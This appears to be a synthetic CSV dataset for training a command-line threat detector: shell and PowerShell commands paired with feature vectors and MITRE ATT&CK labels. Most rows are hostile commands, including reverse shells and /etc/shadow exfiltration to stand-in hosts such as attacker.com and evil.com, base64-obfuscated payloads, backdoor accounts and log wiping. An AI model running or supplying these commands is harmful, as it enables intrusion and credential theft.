time nbtscan 192.168.1.0/24 ; echo done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1018_Remote_System_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"perl -e 'eval pack q/H*/, q/7363726970742e6570732f52656d6f74652e706e67/'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
echo 'backdoor:x:0:0:root:/root:/bin/bash' >> /etc/passwd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1098_Account_Manipulation'],synthetic
sudo cat /etc/passwd | grep -v nologin | grep -v false,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.4, 0.44, 1, 0]",['T1033_System_Owner_Discovery'],synthetic
awk  -F:  '{print  $1}'  /etc/passwd  |  head  -5,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['BENIGN'],synthetic
systemctl enable --now malicious.service,"[0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1053_Scheduled_Task'],synthetic
echo 'bmMgLWUgL2Jpbi9iYXNoIGF0dGFja2VyLmNvbSA4MA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1071_Application_Layer_Protocol', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'KGNyb250YWIgLWw7IGVjaG8gJyogKiAqICogKiAvdG1wL3BheWxvYWQuc2gnKSB8IGNyb250YWIgLQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1053_Scheduled_Task', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""echo 'Zm9yIGkgaW4gJChzZXEgMSAyNTQpOyBkbyBwaW5nIC1jMSAtVzEgMTkyLjE2OC4wLiRpICY+L2Rldi9udWxsICYmIGVjaG8gMTkyLjE2OC4wLiRpOyBkb25l' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1018_Remote_System_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
rm -rf /tmp/* /var/tmp/*,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1070_Indicator_Removal'],synthetic
smbclient  //10.0.0.5/C$  -U  Administrator  |  sleep  1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"nohup perl -e 'eval pack q/H*/, q/7363726970742e6570732f52656d6f74652e706e67/' &","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
scp attacker@10.0.0.99:/tools/linpeas.sh /tmp/,"[1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
echo 'aGVsbG8=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
sudo whoami /all ; history -c,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
Get-LocalGroupMember -Group Administrators,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
nohup echo 'dXNlcmFkZCAtbSAtcyAvYmluL2Jhc2ggLUcgc3VkbyBuZXdhZG1pbg==' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1098_Account_Manipulation', 'T1027_Obfuscated_Files_or_Information']",synthetic
ssh admin@localhost | chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 1]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter']",synthetic
psexec.py Administrator:password@10.0.0.5 cmd.exe,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1021_Remote_Services'],synthetic
cat /etc/shadow | nc 10.0.0.99 4444,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
useradd -m -s /bin/bash hacker,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
ln -s /tmp/backdoor.sh /etc/cron.d/system-update,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1053_Scheduled_Task'],synthetic
su -s /bin/bash www-data | chmod +x /tmp/payload,"[0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 1]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter']",synthetic
wget -q http://miner.com/xmrig -O /tmp/xmr && chmod +x /tmp/xmr && /tmp/xmr -o pool.minexmr.com:443,"[0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.52, 1, 1]",['T1496_Resource_Hijacking'],synthetic
sudo echo 'ZmluZCAvIC13cml0YWJsZSAtdHlwZSBkIDI+L2Rldi9udWxs' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
strings /proc/*/mem | grep -i password,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1003_OS_Credential_Dumping'],synthetic
echo 'Y2F0IC90bXAvZW5jb2RlZCB8IHh4ZCAtciAtcCB8IGJhc2g=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
"bash -c ""net user /add attacker P@ssw0rd""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1136_Create_Account'],synthetic
route  -n,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
curl -s http://c2.attacker.com/beacon,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /d C:\payload.exe | chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.44, 1, 1]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
curl -A 'Mozilla/5.0' http://c2.attacker.com/check-in && sleep 1,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time cat /etc/resolv.conf,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
nmcli connection show,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
who,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
echo 'dW5zaGFkb3cgL2V0Yy9wYXNzd2QgL2V0Yy9zaGFkb3cgPiBjcmFja21l' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1003_OS_Credential_Dumping', 'T1027_Obfuscated_Files_or_Information']",synthetic
nmap -A -T4 192.168.1.0/24,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
useradd  -m  -s  /bin/bash  hacker,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
tftp -i 10.0.0.99 GET payload.exe C:\Windows\Temp\payload.exe,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
wget --post-file=/etc/passwd http://attacker.com/receive,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
getent  passwd  |  grep  -v  nologin,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1087_Account_Discovery'],synthetic
sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1,"[1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1110_Brute_Force'],synthetic
python3 -c 'print(1+1)',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
echo 'bWVkdXNhIC1oIDEwLjAuMC4xIC11IHJvb3QgLVAgL3RtcC9wYXNzd29yZHMudHh0IC1NIHNzaCAmJiBjaG1vZCAreCAvdG1wL3BheWxvYWQ=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo '' > /var/log/syslog,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1070_Indicator_Removal'],synthetic
time nbtscan 192.168.1.0/24,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
echo 'aGVsbG8=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
"nmap -sV -p 22,80,443 10.0.0.0/24","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.2, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
curl -A 'Mozilla/5.0' http://c2.attacker.com/check-in,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
echo 'bm1hcCAtLXNjcmlwdD12dWxuIDEwLjAuMC4xICYmID4gL2Rldi9udWxsIDI+JjE=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1046_Network_Service_Scanning', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
nc -zv 10.0.0.1 1-1000 2>&1 | grep succeeded,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1046_Network_Service_Scanning'],synthetic
cat /etc/group,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
sudo certutil.exe -urlcache -split -f http://attacker.com/nc.exe nc.exe,"[0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0.0, 0.28, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
echo 'cHl0aG9uMyAtYyAiaW1wb3J0IHVybGxpYi5yZXF1ZXN0OyB1cmxsaWIucmVxdWVzdC51cmxyZXRyaWV2ZSgnaHR0cDovL2V2aWwuY29tL3BheWxvYWQnLCAnL3RtcC9wYXlsb2FkJyki' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup ./xmrig --url stratum+tcp://pool.minexmr.com:443 --user wallet &,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1496_Resource_Hijacking'],synthetic
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Defender,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1112_Modify_Registry'],synthetic
reg  delete  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run  /v  Defender,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1112_Modify_Registry'],synthetic
net user /add attacker P@ssw0rd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
passwd  -d  root  ;  >  /dev/null  2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.28, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time id,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
ls -la /root /etc /var/www,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
time echo 'Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAtdiBub2xvZ2luIHwgZ3JlcCAtdiBmYWxzZQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1033_System_Owner_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo echo 'cGVybCAtZSAnZXZhbCBwYWNrIHEvSCovLCBxLzczNjM3MjY5NzA3NDJlNjU3MDczMmY1MjY1NmQ2Zjc0NjUyZTcwNmU2Ny8nICYmIGhpc3RvcnkgLWM=' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1027_Obfuscated_Files_or_Information', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'Y3VybCAtWCBQT1NUIGh0dHA6Ly9ldmlsLmNvbS9jb2xsZWN0IC1kIEAvZXRjL3NoYWRvdyB8IHNsZWVwIDE=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
time locate wp-config.php,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
time systemctl enable --now malicious.service ; chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 1]","['T1053_Scheduled_Task', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"python3 -c ""import urllib.request; urllib.request.urlopen('http://evil.com/?' + open('/etc/shadow').read())""","[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
echo 'd2dldCAtcSAtTy0gLS1oZWFkZXI9J1gtQXV0aDogdG9rZW4xMjMnIGh0dHA6Ly9ldmlsLmNvbS9jbWQ=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1071_Application_Layer_Protocol', 'T1027_Obfuscated_Files_or_Information']",synthetic
systemctl restart nginx,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
nohup cat /proc/version ; sleep 1 &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
cat /etc/group | chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 1]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nc -e /bin/bash attacker.com 80 | > /dev/null 2>&1,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.36, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
groups $(whoami) | chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 1]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'Li9DVkUtMjAyMS00MDM0IHwgY2htb2QgK3ggL3RtcC9wYXlsb2Fk' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'ZmluZCAvIC1wZXJtIC00MDAwIC10eXBlIGYgMj4vZGV2L251bGw=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
getent passwd | awk -F: '$3 >= 1000',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1033_System_Owner_Discovery'],synthetic
echo 'Y2F0IH4vLmF3cy9jcmVkZW50aWFscw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1003_OS_Credential_Dumping', 'T1027_Obfuscated_Files_or_Information']",synthetic
time New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1112_Modify_Registry'],synthetic
nohup nc -e /bin/bash attacker.com 80 &,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
nc -zv 10.0.0.1 1-1000 2>&1 | grep succeeded,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1046_Network_Service_Scanning'],synthetic
"bash -c ""wget --post-file=/etc/passwd http://attacker.com/receive && chmod +x /tmp/payload""","[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 1]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1 | sleep 1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nmap --script=vuln 10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.12, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
history -c && history -w,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]",['T1070_Indicator_Removal'],synthetic
time echo 'Y2F0IC90bXAvZW5jb2RlZCB8IHh4ZCAtciAtcCB8IGJhc2g=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
echo 'compromised ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1098_Account_Manipulation'],synthetic
echo 'ZmluZCAvIC1uYW1lICcqLnBlbScgMj4vZGV2L251bGwgfCBoaXN0b3J5IC1j' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
lscpu,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1082_System_Information_Discovery'],synthetic
crontab -e,"[0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1053_Scheduled_Task'],synthetic
id | echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.2, 0.16, 1, 0]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time echo '@reboot /tmp/backdoor.sh' | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]",['T1053_Scheduled_Task'],synthetic
echo 'bm1hcCAtc1YgLXAgMjIsODAsNDQzIDEwLjAuMC4wLzI0' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1018_Remote_System_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup procdump.exe -ma lsass.exe lsass.dmp &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
uptime,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['BENIGN'],synthetic
time echo 'Zm9yIGkgaW4gJChzZXEgMSAyNTQpOyBkbyBwaW5nIC1jMSAtVzEgMTkyLjE2OC4wLiRpICY+L2Rldi9udWxsICYmIGVjaG8gMTkyLjE2OC4wLiRpOyBkb25l' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1018_Remote_System_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
mkdir -p /opt/myapp,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
echo 'backdoor:x:0:0:root:/root:/bin/bash' >> /etc/passwd && echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup fping -a -g 192.168.1.0/24 2>/dev/null &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.28, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1112_Modify_Registry'],synthetic
Get-LocalGroupMember -Group Administrators | history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup echo '@reboot /tmp/.xmr/xmrig -o pool.minexmr.com' | crontab - &,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 0]",['T1496_Resource_Hijacking'],synthetic
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Defender ; > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.36, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe' | chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.48, 1, 1]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
find /var/log -name '*.log' -exec truncate -s 0 {} \;,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.4, 0, 0]",['T1070_Indicator_Removal'],synthetic
sudo find / -name 'id_rsa' 2>/dev/null && chmod +x /tmp/payload,"[0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0.0, 0.4, 1, 1]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe',"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1112_Modify_Registry'],synthetic
wmiexec.py domain/admin:pass@10.0.0.5 | history -c,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
unset HISTFILE; export HISTSIZE=0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1070_Indicator_Removal'],synthetic
xfreerdp  /u:Administrator  /p:Password123  /v:10.0.0.5,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1021_Remote_Services'],synthetic
nohup cat /etc/group && echo done &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
rm  -rf  /tmp/*  /var/tmp/*,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1070_Indicator_Removal'],synthetic
echo 'c3UgLXMgL2Jpbi9iYXNoIHd3dy1kYXRh' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup getent group sudo | > /dev/null 2>&1 &,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.36, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time getent passwd | grep -v nologin,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]",['T1087_Account_Discovery'],synthetic
